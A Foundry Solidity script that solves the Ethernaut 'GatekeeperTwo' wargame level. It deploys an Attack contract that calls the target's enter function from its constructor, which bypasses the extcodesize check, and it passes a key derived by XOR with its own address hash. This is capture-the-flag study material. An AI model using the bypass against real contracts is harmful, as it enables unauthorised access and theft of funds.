// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../src/14_GatekeeperTwo.sol";
import {Script, console} from "forge-std/Script.sol";

contract GatekeeperTwoSolve is Script {
    GatekeeperTwo gate = GatekeeperTwo(0xe893A070f718C3Ab464d210e08e244aDed487C17);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Entrant Before#", gate.entrant());
        new Attack(address(gate));
        console.log("Entrant After#", gate.entrant());

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor(address gateAddress) {
        GatekeeperTwo gate = GatekeeperTwo(gateAddress);
        uint64 key = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        gate.enter(bytes8(key));
    }
}
